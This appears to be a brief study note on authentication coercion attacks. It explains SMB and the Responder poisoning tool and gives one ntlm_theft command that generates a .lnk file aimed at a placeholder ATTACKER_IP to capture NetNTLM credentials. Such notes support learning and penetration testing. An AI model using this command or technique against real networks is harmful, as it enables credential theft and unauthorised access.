Authentication coercion attacks.

SMB : Server Message Block protocol. ( allows clients to communicate with a server )

Responder : A tool that allows us to perform man-in-the-middle attacks by poisoning the responses 
during NetNTLM authentication, tricking the client into talking to you instead of the actual server they want to connect to.

ntlm_theft : Create documents that require authentification to coerce authentification.
      python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy  (creates lnk file)
